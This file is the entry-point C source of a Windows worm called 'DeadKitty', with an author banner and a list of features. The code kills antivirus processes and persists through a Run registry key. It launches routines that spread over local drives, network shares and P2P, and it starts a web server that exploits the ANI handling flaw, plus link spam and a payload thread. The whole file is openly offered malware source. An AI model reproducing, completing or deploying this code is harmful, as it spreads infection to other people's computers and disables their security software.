   /********************************************************************************
    *  ___                      _  _   _     _    _                                *
    * (  _`\                   ( )( ) ( ) _ ( )_ ( )_                              *
    * | | ) |   __     _ _    _| || |/'/'(_)| ,_)| ,_) _   _                       *
    * | | | ) /'__`\ /'_` ) /'_` || , <  | || |  | |  ( ) ( )                      *
    * | |_) |(  ___/( (_| |( (_| || |\`\ | || |_ | |_ | (_) |                      *
    * (____/'`\____)`\__,_)`\__,_)(_) (_)(_)`\__)`\__)`\__, |                      *
    *                                               ( )_| |                        *
    *                                               `\___/'                        *
    *  _       _                                                                   *
    * ( )  _  ( )                                                                  *
    * | | ( ) | |   _    _ __   ___ ___                                            *
    * | | | | | | /'_`\ ( '__)/' _ ` _ `\                                          *
    * | (_/ \_) |( (_) )| |   | ( ) ( ) |                                          *
    * `\___x___/'`\___/'(_)   (_) (_) (_)                                          *
    *                                                                              *
    *                                                                              *
    *  _                _       _               ___                                *
    * ( )              ( )  _  ( )             (  _`\                              *
    * | |_    _   _    | | ( ) | |   _ _  _ __ | ( (_)   _ _   ___ ___     __      *
    * | '_`\ ( ) ( )   | | | | | | /'_` )( '__)| |___  /'_` )/' _ ` _ `\ /'__`\    *
    * | |_) )| (_) |   | (_/ \_) |( (_| || |   | (_, )( (_| || ( ) ( ) |(  ___/    *
    * (_,__/'`\__, |   `\___x___/'`\__,_)(_)   (____/'`\__,_)(_) (_) (_)`\____)    *
    *        ( )_| |                                                               *
    *        `\___/'                                                               *
    *                                                                              *
    *                                                                              *
    *                                                                              *
    *                                                                              *
    ********************************************************************************/

   /********************************************************************************
    * I would like to thank many people: free0n, Necronomikon, SlageHammer, izee,  *
    * Nibble ... very friendly people, and then Darkv0id, _Machiavel, Mike_Hood.   *
    *                                                                              *
    * The main features of this worm:                                              *
    * 1) AV killer                                                                 *
    * 2) Spread over local drives in zip archives                                  *
    * 3) Spread over p2p in zip archives (using a special scanner)                 *
    * 4) Spread over netbios shares in zip archives (C$,ADMIN$ etc...)             *
    * 5) Spread using the ANI handling flaw with Skype & MAPI                      *
    *    (http://www.microsoft.com/technet/security/advisory/935423.mspx)          *
    *                                                                              *
    * You are free to contact me at wargame89@yahoo.it or visiting                 *
    * http://ihateyou.altervista.org - http://vx.netlux.org/doomriderz             *
    ********************************************************************************/

   #include "DeadKitty.h"

   /* The entry point of worm */
   int __stdcall WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
   {

       char StartPath[MAX_PATH];
       HKEY StartKey;
       LOADED_IMAGE DeadKitty_PEImage;
       WSADATA wsa;
       char MsG[256],HostName[256];
       struct hostent *resolve = NULL;
       int NetCnt = 0,GoodIP = 0;

       CreateMutex(NULL,FALSE,"DeadKitty_by_[WarGame/doomriderz]");

       if(GetLastError() == ERROR_ALREADY_EXISTS)
       {
           ExitProcess(0);
       }

       /* Get some important stuff */
       GetModuleFileName(NULL,DeadKittyPath,MAX_PATH);
       GetWindowsDirectory(WinDir,MAX_PATH);
       GetSystemDirectory(SysDir,MAX_PATH);

       /* Check itself */
       if(MapAndLoad(DeadKittyPath,NULL,&DeadKitty_PEImage,FALSE,TRUE) == FALSE)
       {
           ExitProcess(0);
       }

       /* Check size of image, entry point, number of sections */
       if(DeadKitty_PEImage.SizeOfImage != 0x18000
           || DeadKitty_PEImage.FileHeader->OptionalHeader.AddressOfEntryPoint != 0x87f1
           || DeadKitty_PEImage.FileHeader->FileHeader.NumberOfSections != 0x4)
       {
           sprintf(MsG,"Entry Point: 0x%x,NumSections: 0x%x,SizeOfImage: 0x%x",DeadKitty_PEImage.FileHeader->OptionalHeader.AddressOfEntryPoint,
               DeadKitty_PEImage.FileHeader->FileHeader.NumberOfSections,DeadKitty_PEImage.SizeOfImage);
           MessageBox(NULL,MsG,"Somebody corrupted me!",MB_OK|MB_ICONERROR);
           ExitProcess(0);
       }

       /* unload all stuff */
       UnMapAndLoad(&DeadKitty_PEImage);


       /* Kill all hostile processes */
       AVKiller();

       /* Put worm at startup */
       sprintf(StartPath,"%s\\DeadKitty.exe",SysDir);
       CopyFile(DeadKittyPath,StartPath,FALSE);

       if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
           0,KEY_WRITE,&StartKey) == ERROR_SUCCESS)
       {
           RegSetValueEx(StartKey,"DeadKitty",0,REG_SZ,StartPath,strlen(StartPath));
           RegCloseKey(StartKey);
       }
       else
       {
           ExitProcess(0);
       }

       if(WSAStartup(MAKEWORD(1,1),&wsa) != 0)
       {
           ExitProcess(0);
       }

       while(!gethostbyname("www.trendmicro.com"))
       {
           WAIT(10);
       }

       /* We should be connected to the internet ... */
       /* Start spreading threads */

       DriveSpread(); /* spread over local drives */
       NetShareSpread(); /* spread over shared resources */


       /* get ip of system */
       gethostname(HostName,256);

       if((resolve = gethostbyname(HostName)) == NULL)
       {
           ExitProcess(0);
       }

       while(resolve->h_addr_list[NetCnt])
       {
           GlobalIP = inet_ntoa(*(struct in_addr *)resolve->h_addr_list[NetCnt]);

           if(!strstr(GlobalIP,"192.168") && !strstr(GlobalIP,"10.0")
               && !strstr(GlobalIP,"127.0"))
           {
               GoodIP = 1;
               break;
           }

           NetCnt++;
       }

       /* ---------------- */

       if(GoodIP)
       {
           ANIExploiter(); /* Start our exploiting web server */
           LinkSPAM();
       }

       PayLoad(); /* payload thread */
       P2PScanner(); /* spread over p2p */
   }
